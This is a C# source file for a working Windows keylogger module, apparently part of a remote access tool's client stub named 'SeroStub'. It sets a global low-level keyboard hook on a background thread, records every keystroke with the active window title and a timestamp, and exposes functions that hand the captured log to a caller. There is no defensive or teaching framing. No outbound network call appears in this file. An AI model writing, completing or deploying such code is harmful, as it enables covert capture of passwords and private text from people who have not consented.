using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace SeroStub;

internal static class KeyloggerFeature
{
    // ── WinAPI imports ─────────────────────────────────────────────────────
    [DllImport("user32.dll")] private static extern nint SetWindowsHookEx(int idHook, nint lpfn, nint hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(nint hhk);
    [DllImport("user32.dll")] private static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);
    [DllImport("user32.dll")] private static extern nint GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int GetWindowText(nint hWnd, StringBuilder sb, int cch);
    [DllImport("user32.dll")] private static extern bool GetMessage(out MSG msg, nint hWnd, uint min, uint max);
    [DllImport("user32.dll")] private static extern bool TranslateMessage(ref MSG msg);
    [DllImport("user32.dll")] private static extern nint DispatchMessage(ref MSG msg);
    [DllImport("user32.dll")] private static extern bool PostThreadMessage(uint tid, uint msg, nint wp, nint lp);
    [DllImport("user32.dll")] private static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int ToUnicode(uint vk, uint sc, byte[] ks, StringBuilder buf, int sz, uint flags);
    [DllImport("kernel32.dll")] private static extern uint GetCurrentThreadId();

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public nint hwnd; public uint message; public nint wParam; public nint lParam; public uint time; public int x, y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT { public uint vkCode; public uint scanCode; public uint flags; public uint time; public nint dwExtraInfo; }

    private const int  WH_KEYBOARD_LL = 13;
    private const int  WM_KEYDOWN     = 0x0100;
    private const int  WM_SYSKEYDOWN  = 0x0104;
    private const uint WM_QUIT        = 0x0012;

    // ── State ──────────────────────────────────────────────────────────────
    private static nint         _hook;
    private static Thread?      _thread;
    private static volatile bool _running;
    private static uint         _threadId;
    private static readonly StringBuilder _buf        = new();
    private static readonly object        _bufLock    = new();
    private static          nint          _lastHwnd;
    private static          string        _lastTitle  = string.Empty;

    // ── Public API ─────────────────────────────────────────────────────────

    internal static bool IsRunning => _running;

    internal static void Start()
    {
        if (_running) return;
        _running = true;
        _thread = new Thread(HookThread) { IsBackground = true, Name = "KL" };
        _thread.Start();
    }

    internal static void Stop()
    {
        if (!_running) return;
        _running = false;
        if (_threadId != 0) PostThreadMessage(_threadId, WM_QUIT, 0, 0);
        _thread?.Join(3000);
        _thread = null;
        _threadId = 0;
    }

    internal static string GetAndClearLogs()
    {
        lock (_bufLock)
        {
            var s = _buf.ToString();
            _buf.Clear();
            return s;
        }
    }

    internal static string GetLogs()
    {
        lock (_bufLock) return _buf.ToString();
    }

    // ── Hook thread ────────────────────────────────────────────────────────

    private static unsafe void HookThread()
    {
        _threadId = GetCurrentThreadId();

        // Get function pointer for the hook callback — requires unsafe context
        var fp = (delegate* unmanaged<int, nint, nint, nint>)&HookProc;
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, (nint)fp, nint.Zero, 0);

        if (_hook == nint.Zero)
        {
            _running = false;
            return;
        }

        // Message pump — required for low-level hook to receive events
        while (_running && GetMessage(out var msg, nint.Zero, 0, 0))
        {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }

        UnhookWindowsHookEx(_hook);
        _hook = nint.Zero;
    }

    // ── Hook callback — [UnmanagedCallersOnly] = NativeAOT-safe ───────────

    [UnmanagedCallersOnly]
    private static nint HookProc(int nCode, nint wParam, nint lParam)
    {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
        {
            try { ProcessKey(lParam); } catch { }
        }
        return CallNextHookEx(_hook, nCode, wParam, lParam);
    }

    private static void ProcessKey(nint lParam)
    {
        var khs = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
        uint vk = khs.vkCode;
        uint sc = khs.scanCode;

        // Skip pure modifier keys (don't log shift/ctrl/alt/win alone)
        if (vk is 0xA0 or 0xA1 or 0xA2 or 0xA3 or 0xA4 or 0xA5
                or 0x5B or 0x5C or 0x10 or 0x11 or 0x12) return;

        // Track foreground window for context headers
        var hwnd = GetForegroundWindow();
        if (hwnd != _lastHwnd)
        {
            _lastHwnd = hwnd;
            var titleSb = new StringBuilder(256);
            GetWindowText(hwnd, titleSb, 256);
            string title = titleSb.ToString();
            if (title != _lastTitle && !string.IsNullOrEmpty(title))
            {
                _lastTitle = title;
                lock (_bufLock)
                {
                    if (_buf.Length > 0) _buf.AppendLine();
                    _buf.AppendLine();
                    _buf.AppendLine($"[ {title} — {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC ]");
                }
            }
        }

        // Try to convert VK to printable character using current keyboard layout
        var ks = new byte[256];
        GetKeyboardState(ks);
        var charBuf = new StringBuilder(4);
        int n = ToUnicode(vk, sc, ks, charBuf, 4, 0);

        lock (_bufLock)
        {
            if (n > 0 && charBuf.Length > 0 && !char.IsControl(charBuf[0]))
            {
                _buf.Append(charBuf[0]);
            }
            else
            {
                string? special = VkToLabel(vk);
                if (special != null) _buf.Append(special);
            }

            // Keep buffer bounded (max 512 KB)
            if (_buf.Length > 512 * 1024)
            {
                var text = _buf.ToString();
                _buf.Clear();
                _buf.Append(text[^(256 * 1024)..]);
            }
        }
    }

    private static string? VkToLabel(uint vk) => vk switch
    {
        0x08 => "[Backspace]",
        0x09 => "[Tab]",
        0x0D => "\n[Enter]\n",
        0x1B => "[Esc]",
        0x20 => " ",
        0x21 => "[PgUp]",
        0x22 => "[PgDn]",
        0x23 => "[End]",
        0x24 => "[Home]",
        0x25 => "[←]",
        0x26 => "[↑]",
        0x27 => "[→]",
        0x28 => "[↓]",
        0x2E => "[Del]",
        0x2D => "[Ins]",
        0x70 => "[F1]",  0x71 => "[F2]",  0x72 => "[F3]",  0x73 => "[F4]",
        0x74 => "[F5]",  0x75 => "[F6]",  0x76 => "[F7]",  0x77 => "[F8]",
        0x78 => "[F9]",  0x79 => "[F10]", 0x7A => "[F11]", 0x7B => "[F12]",
        0x13 => "[Pause]",
        0x14 => "[CapsLock]",
        0x90 => "[NumLock]",
        0x91 => "[ScrollLock]",
        _ => null
    };
}

// ── JSON types for SeroJson context ──────────────────────────────────────────
internal class KeyloggerLogsResultStub { public string Logs { get; set; } = ""; public bool IsRunning { get; set; } }
